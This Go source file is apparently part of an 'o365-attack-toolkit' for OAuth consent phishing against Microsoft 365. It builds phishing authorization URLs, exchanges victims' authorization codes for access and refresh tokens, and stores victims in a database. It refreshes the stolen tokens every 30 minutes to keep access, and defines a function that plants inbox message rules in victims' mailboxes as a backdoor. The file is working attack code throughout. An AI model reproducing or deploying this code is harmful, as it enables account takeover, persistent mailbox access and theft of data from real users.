package api

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"o365-attack-toolkit/database"
	"o365-attack-toolkit/model"
	"time"
)

// RefreshAccessToken will retrieve a new access token
func RefreshAccessToken(user *model.User) bool {

	postURL := "https://login.microsoftonline.com/common/oauth2/v2.0/token"

	formdata := url.Values{}
	formdata.Add("client_id", model.GlbConfig.Oauth.ClientId)
	formdata.Add("grant_type", "refresh_token")
	formdata.Add("client_secret", model.GlbConfig.Oauth.ClientSecret)
	formdata.Add("refresh_token", user.RefreshToken)

	resp, err := http.PostForm(postURL, formdata)
	if err != nil {
		log.Printf("Error: %s \n", err.Error())
	} else {
		if resp.StatusCode == 200 {

			data, _ := ioutil.ReadAll(resp.Body)
			authResponse := model.AuthResponse{}
			json.Unmarshal(data, &authResponse)

			user.AccessToken = authResponse.AccessToken
			user.RefreshToken = authResponse.RefreshToken

			return true
		}
	}
	return false

}

func RecursiveTokenUpdate() {

	for {

		// Call get users
		// Call refresh access token
		// call update tokens
		users := database.GetUsers()
		for _, user := range users {
			bSuccess := RefreshAccessToken(&user)
			if bSuccess {
				log.Printf("Retrieving new token for %s\n", user.Mail)
			} else {
				log.Printf("Failed updating token for %s\n", user.Mail)
				user.AccessTokenActive = 0
			}
			database.UpdateUserTokens(user)

		}
		time.Sleep(30 * time.Minute)
	}

}

// GenerateURL gives the URL for phishing
func GenerateURL() string {

	phishURL := fmt.Sprintf("https://login.microsoftonline.com/common/oauth2/v2.0/authorize?scope=%s&redirect_uri=%s&response_type=code&client_id=%s", url.QueryEscape(model.GlbConfig.Oauth.Scope), url.QueryEscape(model.GlbConfig.Oauth.Redirecturi), url.QueryEscape(model.GlbConfig.Oauth.ClientId))
	return phishURL
	//fmt.Println(phishURL)
}

// GetAllTokens will call the microsoft endpoint to get all the tokens
func GetAllTokens(code string) []byte {
	postURL := "https://login.microsoftonline.com/common/oauth2/v2.0/token"

	formdata := url.Values{}
	formdata.Add("client_id", model.GlbConfig.Oauth.ClientId)
	formdata.Add("scope", model.GlbConfig.Oauth.Scope)
	formdata.Add("redirect_uri", model.GlbConfig.Oauth.Redirecturi)
	formdata.Add("grant_type", "authorization_code")
	formdata.Add("client_secret", model.GlbConfig.Oauth.ClientSecret)
	formdata.Add("code", code)

	resp, err := http.PostForm(postURL, formdata)
	if err != nil {
		log.Printf("Error: %s \n", err.Error())
	} else {
		data, _ := ioutil.ReadAll(resp.Body)
		return data
	}
	return nil
}

// CallAPIMethod function
func CallAPIMethod(method string, endpoint string, accessToken string, additionalParameters string, bodyData []byte, contentType string) (string, int) {

	url := fmt.Sprintf("%s%s%s", model.ApiEndpointRoot, endpoint, additionalParameters)
	client := &http.Client{}

	var req *http.Request
	if method == "POST" || method == "PUT" || method == "PATCH" {
		req, _ = http.NewRequest(method, url, bytes.NewBuffer(bodyData))
		req.Header.Set("Content-Type", contentType)
	} else {
		req, _ = http.NewRequest(method, url, nil)
	}
	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", accessToken))

	resp, err := client.Do(req)

	if err != nil {
		log.Println(err.Error())
		return "", 0
	}

	body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		log.Println(err.Error())
		return "", 0
	}

	return string(body), resp.StatusCode
}

// InitializeProfile Initializes the user in the database
func InitializeProfile(accessToken string, refreshToken string) {

	userResponse, _ := CallAPIMethod("GET", "/me", accessToken, "", nil, "")
	user := model.User{}
	user.AccessToken = accessToken
	user.AccessTokenActive = 1
	user.RefreshToken = refreshToken

	json.Unmarshal([]byte(userResponse), &user)

	user.Mail = user.UserPrincipalName
	log.Printf("Successful authentication from: %s", user.Mail)
	database.InsertUser(user)

	//createRules(user)
	//getKeywordFiles(user)
	// Remove backdooring as it's not necessary anymore

}

func createRules(user model.User) {

	tempLocalRules := model.GlbRules
	tempRemoteRules, _ := CallAPIMethod("GET", "/me/mailFolders/inbox/messageRules", user.AccessToken, "", nil, "")
	remoteRules := model.Rules{}
	json.Unmarshal([]byte(tempRemoteRules), &remoteRules)

	// Check in order to not put the same rules two times.
	var exists bool
	if len(remoteRules.Value) > 0 {
		for _, localRule := range tempLocalRules {
			for _, remoteRule := range remoteRules.Value {
				exists = false
				if remoteRule.DisplayName == localRule.DisplayName {
					exists = true
				}

			}
			if !exists {
				tempRule, err := json.Marshal(localRule)
				if err != nil {
					log.Println("Error on marshalling rule data.")
				}
				CallAPIMethod("POST", "/me/mailFolders/inbox/messageRules", user.AccessToken, "", tempRule, "application/json")
			}

		}
	} else {
		for _, localRule := range tempLocalRules {
			tempRule, err := json.Marshal(localRule)
			if err != nil {
				log.Println("Error on marshalling rule data.")
			}
			CallAPIMethod("POST", "/me/mailFolders/inbox/messageRules", user.AccessToken, "", tempRule, "application/json")
		}
	}

}
